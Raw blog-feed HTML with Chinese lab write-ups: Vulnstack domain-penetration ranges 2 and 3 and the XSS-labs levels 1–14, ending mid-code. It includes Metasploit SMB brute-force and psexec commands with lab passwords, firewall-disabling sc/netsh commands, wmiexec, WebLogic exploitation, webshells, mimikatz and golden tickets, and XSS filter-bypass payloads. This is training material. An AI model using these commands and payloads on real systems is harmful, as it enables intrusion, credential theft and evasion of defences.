constant_">WIN2008</span><span class="hljs-symbol">:&lt;</span><span class="hljs-number">00</span>&gt;<span class="hljs-symbol">:U</span> <span class="hljs-symbol">:TEST</span><span class="hljs-symbol">:&lt;</span><span class="hljs-number">00</span>&gt;<span class="hljs-symbol">:G</span> <span class="hljs-symbol">:WIN2008</span><span class="hljs-symbol">:&lt;</span><span class="hljs-number">20</span>&gt;<span class="hljs-symbol">:U</span> <span class="hljs-symbol">:</span><span class="hljs-number">00</span><span class="hljs-symbol">:</span>0<span class="hljs-symbol">c:</span><span class="hljs-number">29</span><span class="hljs-symbol">:ab</span><span class="hljs-symbol">:</span><span class="hljs-number">44</span><span class="hljs-symbol">:ec</span>)<br>[*] <span class="hljs-title class_">Scanned</span>  <span class="hljs-number">26</span> of <span class="hljs-number">256</span> hosts (<span class="hljs-number">10</span>% complete)<br>[+] <span class="hljs-title class_">Discovered</span> <span class="hljs-title class_">Net</span>BIOS on <span class="hljs-number">192.168</span>.<span class="hljs-number">93.30</span><span class="hljs-symbol">:</span><span class="hljs-number">137</span> (<span class="hljs-variable constant_">WIN7</span><span class="hljs-symbol">:&lt;</span><span class="hljs-number">20</span>&gt;<span class="hljs-symbol">:U</span> <span class="hljs-symbol">:WIN7</span><span class="hljs-symbol">:&lt;</span><span class="hljs-number">00</span>&gt;<span class="hljs-symbol">:U</span> <span class="hljs-symbol">:TEST</span><span class="hljs-symbol">:&lt;</span><span class="hljs-number">00</span>&gt;<span class="hljs-symbol">:G</span> <span class="hljs-symbol">:TEST</span><span class="hljs-symbol">:&lt;</span>1e&gt;<span class="hljs-symbol">:G</span> <span class="hljs-symbol">:TEST</span><span class="hljs-symbol">:&lt;</span>1d&gt;<span class="hljs-symbol">:U</span> <span class="hljs-symbol">:__MSBROWSE__</span><span class="hljs-symbol">:&lt;</span><span class="hljs-number">01</span>&gt;<span class="hljs-symbol">:G</span> <span class="hljs-symbol">:</span><span class="hljs-number">00</span><span class="hljs-symbol">:</span>0<span class="hljs-symbol">c:</span><span class="hljs-number">29</span><span class="hljs-symbol">:e0</span><span class="hljs-symbol">:</span><span class="hljs-number">74</span><span class="hljs-symbol">:</span>2b)<br></code></pre></td></tr></table></figure><p>存在3个主机，namp扫描</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">proxychains4</span> nmap -Pn -sT -sV <span class="hljs-number">192.168.93.10</span> <span class="hljs-number">192.168.93.20</span> <span class="hljs-number">192.168.93.30</span> -F<br></code></pre></td></tr></table></figure><p><img src="/2024/11/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA3/image-20241112210127279.png" alt="image-20241112210127279"></p><p>192.168.93.10开放53端口，域控主机</p><p>利用msf模块进行进行SMB爆破PC主机密码</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gams">use auxiliary/scanner/smb/smb_login<br><span class="hljs-keyword">set</span> RHOSTS <span class="hljs-comment">192.168.93.30</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">PASS_FILE</span> /home/<span class="hljs-comment">a</span>/桌面/<span class="hljs-comment">fuzzDicts</span>/passwordDict/<span class="hljs-comment">top500.txt</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">SMBUser administrator</span><br>exploit<br></code></pre></td></tr></table></figure><p><img src="/2024/11/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA3/image-20241113173159551.png" alt="image-20241113173159551"></p><p>爆破win 2008主机密码</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> RHOSTS <span class="hljs-comment">192.168.93.20</span><br>exploit<br></code></pre></td></tr></table></figure><p><img src="/2024/11/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA3/image-20241113173315508.png" alt="image-20241113173315508"></p><p>爆破win 2012主机密码</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> RHOSTS <span class="hljs-comment">192.168.93.10</span><br>exploit<br></code></pre></td></tr></table></figure><p><img src="/2024/11/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA3/image-20241113173405019.png" alt="image-20241113173405019"></p><p>得到其中一个shell,也可得到密码</p><p><img src="/2024/11/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA3/image-20241113182254811.png" alt="image-20241113182254811"></p><h2 id="PC"><a href="#PC" class="headerlink" title="PC"></a>PC</h2><p>使用msf自带模块进行攻击</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">use exploit/windows/smb/psexec<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp<br><span class="hljs-built_in">set</span> SMBUser administrator<br><span class="hljs-built_in">set</span> SMBPass 123qwe!ASD<br><span class="hljs-built_in">set</span> RHOSTS 192.168.93.30<br>exploit<br></code></pre></td></tr></table></figure><p><img src="/2024/11/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA3/image-20241113173658813.png" alt="image-20241113173658813"></p><h2 id="win2008"><a href="#win2008" class="headerlink" title="win2008"></a>win2008</h2><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> RHOSTS <span class="hljs-comment">192.168.93.20</span><br>exploit<br></code></pre></td></tr></table></figure><p><img src="/2024/11/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA3/image-20241113174904275.png" alt="image-20241113174904275"></p><h2 id="win2012（域控）"><a href="#win2012（域控）" class="headerlink" title="win2012（域控）"></a>win2012（域控）</h2><h3 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h3><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> RHOSTS <span class="hljs-comment">192.168.93.10</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">SMBPass zxcASDqw123!!</span><br>exploit<br></code></pre></td></tr></table></figure><p>有防火墙，失败</p><p>连接到win2008,迁移到域用户程序，成功访问域控</p><p><img src="/2024/11/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA3/image-20241113201645602.png" alt="image-20241113201645602"></p><p>关闭防火墙</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">sc </span>\\<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">93</span>.<span class="hljs-number">10</span> create unablefirewall <span class="hljs-keyword">binpath= </span><span class="hljs-string">&quot;netsh advfirewall set allprofiles state off&quot;</span><br><span class="hljs-keyword">sc </span>\\<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">93</span>.<span class="hljs-number">10</span> start unablefirewall<br></code></pre></td></tr></table></figure><p>再执行，成功getshell</p><p><img src="/2024/11/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA3/image-20241113201907790.png" alt="image-20241113201907790"></p><h3 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h3><p>或者使用另外一种方法</p><p>使用impacket包中的wmiexec工具，这里我用的0.9.24的文件，<a href="https://github.com/fortra/impacket/releases">Releases · fortra/impacket (github.com)</a>，最新0.12和0.9.19文件都不行</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> wmiexec.<span class="hljs-keyword">py</span> <span class="hljs-string">&#x27;administrator:zxcASDqw123!!@192.168.93.10&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/2024/11/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA3/image-20241113180756014.png" alt="image-20241113180756014"></p><p>参考：</p><p><a href="https://www.freebuf.com/articles/web/340671.html">ATT&amp;CK红队评估（红日靶场三） - FreeBuf网络安全行业门户</a></p><p><a href="https://mp.weixin.qq.com/s/w7-PelJliBh6pvBtYBEHzQ">记一次靶场内网渗透（四） (qq.com)</a></p><p><a href="https://www.freebuf.com/articles/web/289947.html">ATK&amp;CK红队评估实战靶场（三） - FreeBuf网络安全行业门户</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ATT—CK红队评估实战内网靶场2</title>
    <link href="/2024/11/05/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA2/"/>
    <url>/2024/11/05/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA2/</url>
    
    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>靶机通用密码： 1qaz@WSX</p><p>管理员账号密码：Administrator/1qaz@WSX</p><p>WEB：10.10.10.80     192.168.111.80</p><p>PC：10.10.10.201</p><p>DC：10.10.10.10</p><p>web登录de1ay/1qaz@WSX，启动C:\Oracle\Middleware\user_projects\domains\base_domain\bin\startWebLogic，需要使用管理员权限</p><p>WEB机和PC机：计算机右键-&gt;管理-&gt;配置-&gt;服务，启动Server、Workstation、Computer Browser ，我操作时，前面两个已启动，只需启动Computer Browser</p><p><img src="/2024/11/05/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA2/image-20241105174352874.png" alt="image-20241105174352874"></p><p>出现ip无法识别，最后指定网卡后解决</p><p><img src="/2024/11/05/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA2/image-20241105181525833.png" alt="image-20241105181525833"></p><h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p>nmap使用syn包扫描</p><p><img src="/2024/11/05/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA2/image-20241105203232218.png" alt="image-20241105203232218"></p><p>不带参数好像也行</p><p><img src="/2024/11/05/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA2/image-20241106105037282.png" alt="image-20241106105037282"></p><p>发现存在7001端口，说明存在weblogic服务，工具检查</p><p><img src="/2024/11/05/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA2/image-20241105200057115.png" alt="image-20241105200057115"></p><p>存在cve-2016-0638,漏洞利用</p><p><img src="/2024/11/05/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA2/image-20241105202821134.png" alt="image-20241105202821134"></p><p>上传jsp马</p><p><img src="/2024/11/05/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA2/image-20241105202842125.png" alt="image-20241105202842125"></p><p>蚁剑连接</p><p><img src="/2024/11/05/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA2/image-20241106104554113.png" alt="image-20241106104554113"></p><h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>发现内网10.10.10.1/24，同时找到DC和PC的IP</p><p><img src="/2024/11/05/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA2/image-20241106105441538.png" alt="image-20241106105441538"></p><p>关闭防火墙 netsh advfirewall set allprofiles state off</p><p> 查看域 net view /domain</p><p><img src="/2024/11/05/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA2/image-20241106161129450.png" alt="image-20241106161129450"></p><p>连上cs后提权，运行minikatz</p><p><img src="/2024/11/05/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA2/image-20241105222131247.png" alt="image-20241105222131247"></p><p>postscan扫描内网</p><p><img src="/2024/11/05/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA2/image-20241106105147360.png" alt="image-20241106105147360"></p><p>均存在445端口，设置smb监听，psexec 内网横向移动</p><p><img src="/2024/11/05/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA2/image-20241106155837159.png" alt="image-20241106155837159"></p><h1 id="域控权限维持"><a href="#域控权限维持" class="headerlink" title="域控权限维持"></a>域控权限维持</h1><h2 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h2><p>黄金票据是伪造票据授予票据（TGT），也被称为认证票据。TGT仅用于向域控制器上的密钥分配中心（KDC）证明用户已被其他域控制器认证。</p><p>要求：域名称、域SID、krbtgt账户NTLM密码哈希、伪造用户名</p><p><img src="/2024/11/05/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA2/image-20241107143825055.png" alt="image-20241107143825055"></p><p><img src="/2024/11/05/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA2/image-20241107143527270.png" alt="image-20241107143527270"></p><p>右键-&gt;Access-&gt;Golden Ticket</p><p><img src="/2024/11/05/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA2/image-20241107144141579.png" alt="image-20241107144141579"></p><p><img src="/2024/11/05/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA2/image-20241107144113696.png" alt="image-20241107144113696"></p><p>参考：</p><p><a href="https://mp.weixin.qq.com/s/x6-i7LF_Zy0gPSnutaNmpg">ATT&amp;CK实战系列-红队评估 （二）Vulnstack靶场内网域渗透 (qq.com)</a></p><p><a href="https://www.cnblogs.com/yokan/p/14189154.html">【红日安全-VulnStack】ATT&amp;CK实战系列——红队实战(二) - yokan - 博客园 (cnblogs.com)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>不死马心得</title>
    <link href="/2024/09/14/%E4%B8%8D%E6%AD%BB%E9%A9%AC%E5%BF%83%E5%BE%97/"/>
    <url>/2024/09/14/%E4%B8%8D%E6%AD%BB%E9%A9%AC%E5%BF%83%E5%BE%97/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 密码错误" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="b10333045d04dd3c4b19f2bf80a14ec58347e710d394d6fb4c111482c2c5cce0"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 这里需要密码.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>XSS_labs_writeup</title>
    <link href="/2024/09/05/XSS-writeup/"/>
    <url>/2024/09/05/XSS-writeup/</url>
    
    <content type="html"><![CDATA[<h1 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h1><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="hljs-built_in">?name</span>=<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p><img src="/2024/09/05/XSS-writeup/image-20240905222124904.png" alt="image-20240905222124904"></p><p>name参数未过滤直接传入html代码</p><h1 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h1><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-string">&quot; onclick=&quot;</span><span class="hljs-function"><span class="hljs-title">alert</span>(<span class="hljs-number">1</span>)</span><br><span class="hljs-string">&quot;&gt;  &lt;script&gt;alert()&lt;/script&gt;  &lt;&quot;</span>  <br></code></pre></td></tr></table></figure><p><img src="/2024/09/05/XSS-writeup/image-20240905222529637.png" alt="image-20240905222529637"></p><p>对keyword执行了html实体转码，因此思路是闭合双引号</p><h1 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h1><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean"><span class="hljs-string">&#x27;onclick=&#x27;</span>alert(<span class="hljs-number">1</span>)<br><span class="hljs-string">&#x27; onfocus=javascript:alert() &#x27;</span>     #onfocus可以绕过html实体化（即&lt;&gt;号的过滤）<br></code></pre></td></tr></table></figure><p><img src="/2024/09/05/XSS-writeup/image-20240905223056342.png" alt="image-20240905223056342"></p><p>html实体编码+单引号闭合</p><h1 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h1><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-string">&quot; onfocus=javascript:alert() &quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2024/09/05/XSS-writeup/image-20240905223448606.png" alt="image-20240905223448606"></p><p>尖括号过滤+html实体编码+双引号闭合</p><h1 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&quot;&gt; <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">javascript:alert()</span>&gt;</span>href<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> &lt;&quot;<br></code></pre></td></tr></table></figure><p><img src="/2024/09/05/XSS-writeup/image-20240905223715662.png" alt="image-20240905223715662"></p><p>小写转换+script 、on过滤</p><h1 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml">&quot;&gt; <span class="hljs-tag">&lt;<span class="hljs-name">sCript</span>&gt;</span>alert()<span class="hljs-tag">&lt;/<span class="hljs-name">sCript</span>&gt;</span> &lt;&quot;<br>&quot; Onfocus=javascript:alert() &quot;<br>&quot;&gt; <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">hRef</span>=<span class="hljs-string">javascript:alert()</span>&gt;</span>Herf<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> &lt;&quot;<br></code></pre></td></tr></table></figure><p><img src="/2024/09/05/XSS-writeup/image-20240905224001359.png" alt="image-20240905224001359"></p><p>过滤掉一堆字符，但没有大小写，可以用大小写绕过</p><h1 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml">&quot; /&gt;<span class="hljs-tag">&lt;<span class="hljs-name">sscriptcript</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">sscriptcript</span>&gt;</span>//<br>&quot;&gt; <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">hrehreff</span>=<span class="hljs-string">javasscriptcript:alert()</span>&gt;</span>HHerf<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> &lt;&quot;<br></code></pre></td></tr></table></figure><p><img src="/2024/09/05/XSS-writeup/image-20240905224319770.png" alt="image-20240905224319770"></p><p>小写转换+一堆字符过滤，双拼写绕过</p><h1 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h1><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">&amp;#<span class="hljs-number">106</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">118</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">115</span>;&amp;#<span class="hljs-number">99</span>;&amp;#<span class="hljs-number">114</span>;&amp;#<span class="hljs-number">105</span>;&amp;#<span class="hljs-number">112</span>;&amp;#<span class="hljs-number">116</span>;&amp;#<span class="hljs-number">58</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">108</span>;&amp;#<span class="hljs-number">101</span>;&amp;#<span class="hljs-number">114</span>;&amp;#<span class="hljs-number">116</span>;&amp;#<span class="hljs-number">40</span>;&amp;#<span class="hljs-number">41</span>;    #href的隐藏属性自动Unicode解码<br></code></pre></td></tr></table></figure><p><img src="/2024/09/05/XSS-writeup/image-20240906151712103.png" alt="image-20240906151712103"></p><p>html实体转化+小写转换+src、data、onfocus、href、script、双引号过滤</p><h1 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h1><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">&amp;#<span class="hljs-number">106</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">118</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">115</span>;&amp;#<span class="hljs-number">99</span>;&amp;#<span class="hljs-number">114</span>;&amp;#<span class="hljs-number">105</span>;&amp;#<span class="hljs-number">112</span>;&amp;#<span class="hljs-number">116</span>;&amp;#<span class="hljs-number">58</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">108</span>;&amp;#<span class="hljs-number">101</span>;&amp;#<span class="hljs-number">114</span>;&amp;#<span class="hljs-number">116</span>;&amp;#<span class="hljs-number">40</span>;&amp;#<span class="hljs-number">41</span>;<span class="hljs-comment">/* http:// */</span>              #注释http，以便弹窗<br></code></pre></td></tr></table></figure><p><img src="/2024/09/05/XSS-writeup/image-20240906152229719.png" alt="image-20240906152229719"></p><p>前面一关添加了http检测，插入指定内容（<a href="http://）绕过检测">http://）绕过检测</a></p><h1 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h1><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">t_sort</span>=<span class="hljs-string">&quot; onfocus=javascript:alert() type=&quot;</span>text<br></code></pre></td></tr></table></figure><p><img src="/2024/09/05/XSS-writeup/image-20240906152505456.png" alt="image-20240906152505456"></p><p>过滤掉尖括号+输入框隐藏，用onfocus+加上type=”text显示</p><h1 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h1><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-symbol">Referer:</span> <span class="hljs-string">&quot; onfocus=javascript:alert() type=&quot;</span><span class="hljs-keyword">text</span><br></code></pre></td></tr></table></figure><p><img src="/2024/09/05/XSS-writeup/image-20240906152838728.png" alt="image-20240906152838728"></p><p>Referer传参+尖括号过滤+html实体转码</p><h1 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h1><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-string">&quot; onfocus=javascript:alert() type=&quot;</span><span class="hljs-built_in">text</span><br></code></pre></td></tr></table></figure><p><img src="/2024/09/05/XSS-writeup/image-20240906153404992.png" alt="image-20240906153404992"></p><p>与上一关同理，传参换成UAt头</p><h1 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h1><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">user</span><span class="hljs-operator">=</span><span class="hljs-string">&quot; onclick=alert() type=&quot;</span>text <br></code></pre></td></tr></table></figure><p><img src="/2024/09/05/XSS-writeup/image-20240906153628967.png" alt="image-20240906153628967"></p><p>同时，cookie中user传参</p><h1 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h1><p>图片EXIF注入，上传一个属性里面含有xss代码的图片</p><p><img src="/2024/09/05/XSS-writeup/image-20240906165226579.png" alt="image-20240906165226579"></p><p>设置修改level14.php中的src</p><p><img src="/2024/09/05/XSS-writeup/image-20240906165626203.png" alt="image-20240906165626203"></p><p>给足权限，设置index.php，代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs php"><span 